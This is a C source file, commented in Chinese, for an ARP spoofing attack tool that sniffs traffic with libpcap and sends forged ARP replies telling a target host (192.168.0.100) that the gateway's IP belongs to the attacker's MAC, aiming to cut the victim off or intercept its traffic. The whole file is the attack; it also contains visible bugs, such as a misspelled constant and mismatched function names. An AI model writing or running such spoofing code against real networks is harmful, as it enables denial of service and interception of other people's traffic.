/********************************************************************
*功能是假冒ip地址，向攻击目标不间断的发送：我的IP是xxx，MAC是xxx。从而
*达到ARP欺骗的目录。可以貌似路由器的IP地址和MAC地址，要填写错误的MAC地
*址，从而让对方找不到
*用到pcap开源库
*********************************************************************/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <netdb.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <net/if.h>
#include <netinet/ip.h>


int sockfd; 
struct sockaddr_ll peer_addr; 
unsigned char my_ip[4] = {192,168,0,1}; //my ip address
unsigned char gateway_ip[4] = {192,168,0,1}; //gateway ip address
unsigned char attack_ip[4] = {192,168,0,100}; //ip adress to be attacked
unsigned char my_mac[6] = {0xc8,0xaa,0x33,0x37,0xd4,0x28 }; //my mac address



//封装arp包
struct arp_packet {
        struct ether_header  eh;
        struct ether_arp arp;
};

//封装ip包 
struct ip_packet{
    struct ether_header eh;
    struct iphdr ip;
};


void send_arp(const unsigned char* attack_ip);
void process_arppachet(struct arp_packet *packet);
void echo_head(char *);
void echo(char *);
void echo_end(char *);


/**
 * 发送arp包到攻击主机
 */
void send_arp(const unsigned char* attack_ip) 
{
        unsigned char broad_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};//发送广播包为了获取网关地址
        //开始构造arp桢
        struct arp_packet frame;
        memcpy(frame.eh.ether_dhost, broad_mac, 6);
        memcpy(frame.eh.ether_shost, my_mac, 6);
        frame.eh.ether_type = htons(ETH_P_ARP);
        frame.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
        frame.arp.ea_hdr.ar_pro = htons(ETH_P_IP);
        frame.arp.ea_hdr.ar_hln = 6;
        frame.arp.ea_hdr.ar_pln = 4;
        frame.arp.ea_hdr.ar_op = htons(ARPOP_REQUEST);
        memcpy(frame.arp.arp_sha, my_mac, 6);
        memcpy(frame.arp.arp_spa, my_ip, 4);
        memcpy(frame.arp.arp_tha, broad_mac, 6);
        memcpy(frame.arp.arp_tpa, attack_ip, 4);
        sendto(sockfd, &frame, sizeof(frame), 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));
        printf("success send arp request to 192.168.18.%d\n", attack_ip[3]);
}

/**
 * 分析arp包
 */
void process_arppacket(struct arp_packet *packet)
{
    echo_head("process_arppacket");
    struct arp_packet *old_frame = packet;
    struct arp_packet frame;
    memcpy(&frame, packet, sizeof(frame));
    int ar_op = ntohs(frame.arp.ea_hdr.ar_op);
    // ------------------------------------arp frame info-------------------------------------------------------
    if (ar_op == ARPOP_REQUEST)
        printf("arp request\t");
    if (ar_op == ARPOP_RREPLY)
        printf("arp reply \t");
    char ip_buf[128];
    inet_ntop(AF_INET, &old_frame->arp.arp_spa, ip_buf, sizeof(ip_buf));
    printf("[%s](%s)",
            ether_ntoa((struct ether_addr *) &old_frame->arp.arp_sha), ip_buf);
    printf("\t->\t");
    memset(ip_buf, 0, sizeof(ip_buf));
    inet_ntop(AF_INET, &old_frame->arp.arp_tpa, ip_buf, sizeof(ip_buf));
    printf("[%s](%s)",
            ether_ntoa((struct ether_addr *) &old_frame->arp.arp_tha), ip_buf);
    printf("\n");
// ---------------------------------------------------------------------------------------------
    if(ar_op == ARPOP_REPLY && (old_frame->arp.arp_spa)[3] == attack_ip[3] && (old_frame->arp.arp_tpa)[3] == my_ip[3]) 
    {        //normal arp reply from attack_ip
             //bulid faked arp reply frame
             memcpy(frame.eh.ether_dhost, old_frame->arp.arp_sha, 6);
             memcpy(frame.eh.ether_shost, my_mac, 6);
             frame.eh.ether_type = htons(ARPOP_REPLY);
             memcpy(frame.arp.arp_tha, old_frame->arp.arp_sha, 6);
             memcpy(frame.arp.arp_tpa, attack_ip, 4);
             memcpy(frame.arp.arp_sha, my_mac, 6);
             memcpy(frame.arp.arp_spa, gateway_ip, 4);
             //send faked arp reply frame
             sendto(sockfd, &frame, sizeof(frame), 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));
             printf("success faked 192.168.18.%d \n", (old_frame->arp.arp_spa)[3]);
     }
     if(((ar_op == ARPOP_REQUEST) && (old_frame->arp.arp_spa)[3] == gateway_ip[3]) ||
        (ar_op == ARPOP_REQUEST && (old_frame->arp.arp_spa)[3] == attack_ip[3] && (old_frame->arp.arp_tpa)[3] == gateway_ip[3]))
     { 
             //case 2 a
             //sleep(5);
             send_arp(attack_ip);
     }

}



void process_ippacket(struct iphdr *ip)
{
    echo_head("process_ippacket");
    struct in_addr addr;
    addr.s_addr = ip->saddr;
    printf("%s---->\n",inet_ntoa(addr));
    addr.s_addr = ip->daddr;
    printf("%s\n",inet_ntoa(addr));
    int protocol = ip->protocol;
    switch(protocol)
    {
        case IPPROTO_TCP:
            printf("tcp\n");
            break;
        case    IPPROTO_UDP:
            printf("udp\n");
            break;
        case IPPROTO_SCTP:
            break;
        default:
            printf("the protocol is:%d\n",protocol);
            break;
    }
    //send_arp(attack_ip);//给攻击ip发送伪造的arp包


    echo_end("process_ippacket");
}


//pcap 回掉函数，用于监听网络上的数据包
void callback(unsigned char *args, const struct pcap_pkthdr *head,const unsigned char *packet)
{
    struct ether_header *eh = (struct ether_header *) packet;
    switch (ntohs(eh->ether_type))
    {
        case ETHERTYPE_ARP:
            if (head->len > sizeof(struct ether_header) + sizeof(struct iphdr)) 
        	{
                process_arppacket((struct arp_packet *) packet);
            }
            break;
        case ETHERTYPE_IP:
            if (head->len > sizeof(struct ether_header) + sizeof(struct iphdr)) 
        	{
                process_ippacket((struct iphdr *)(packet+sizeof(struct ether_header)));
            }
            break;
        default:
            printf("ether type is:%x\n",eh->ether_type);
            break;
    }
}


//通过pcap监听网络情况
void *arp_listen(void *arg) {
        char errbuf[1024];
        char *dev= "eth0";
        unsigned int net,mask;
        struct bpf_program fp;
        
        pcap_t *handle = pcap_open_live(dev, 2048, 1, 1000, errbuf);

        if(handle == NULL)
            printf("pcap_open_live():%s\n", errbuf);

        if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
            printf("pcap_lookupnet():%s\n", errbuf);
        if(pcap_compile(handle, &fp, "arp or ip", 0, net) == -1)
            printf("pcap_compile():%s\n", errbuf);
        
        if(pcap_setfilter(handle, &fp) == -1)
            printf("pcap_setfilter():%s\n", errbuf);

        

        
        while(pcap_loop(handle, -1, callback, NULL) != -1);
        return NULL;
}

int main(int argc, char **argv) 
{
        pthread_t tid;
        struct ifreq req;
        printf("xxxxxxxxxxxxxxxxxxxxx\n");
        pthread_create(&tid, NULL, arp_listen, NULL);
        sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if(sockfd == -1)
            perror("socket()");
        memset(&peer_addr, 0, sizeof(peer_addr));

        peer_addr.sll_family = AF_PACKET;

        strcpy(req.ifr_name, "eth0");
        if(ioctl(sockfd, SIOCGIFINDEX, &req) != 0)
            perror("ioctl()");
        peer_addr.sll_ifindex = req.ifr_ifindex;
        peer_addr.sll_protocol = htons(ETH_P_ARP);
        send_arp(attack_ip);//给攻击ip发送伪造的arp包
        pthread_exit(NULL);//退出主线程
        return 0;
}
void echo_head(char *str){
    if(str==NULL){
            return;
    }
    printf("-------------BEGIN %s----------------------\n",str);
}

void echo(char *str)
{
    if(str==NULL)
    {
        return;
    }
    printf("%s\n",str);
}
void echo_end(char *str)
{
    if(str==NULL)
    {
            return;
    }
    printf("---------------END %s-----------------------\n",str);
}  


